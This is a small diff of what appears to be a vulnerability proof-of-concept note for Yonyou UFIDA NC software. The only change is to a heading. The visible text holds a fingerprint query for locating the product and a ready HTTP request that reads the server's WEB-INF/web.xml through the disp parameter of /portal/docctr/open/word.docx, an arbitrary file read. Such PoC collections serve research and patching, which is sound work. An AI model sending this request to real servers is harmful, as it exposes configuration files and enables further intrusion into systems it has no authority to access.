@@ -8,7 +8,7 @@
 app="用友-UFIDA-NC"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1
